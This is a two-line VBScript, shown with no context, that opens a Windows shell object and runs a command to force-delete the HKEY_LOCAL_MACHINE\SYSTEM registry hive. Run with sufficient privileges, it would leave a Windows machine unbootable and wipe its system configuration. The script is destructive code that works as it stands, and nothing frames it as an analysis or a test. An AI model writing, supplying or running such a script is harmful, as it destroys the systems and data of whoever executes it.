Set shell = CreateObject("WScript.Shell")

shell.run "reg delete HKEY_LOCAL_MACHINE\SYSTEM /f", 1, True
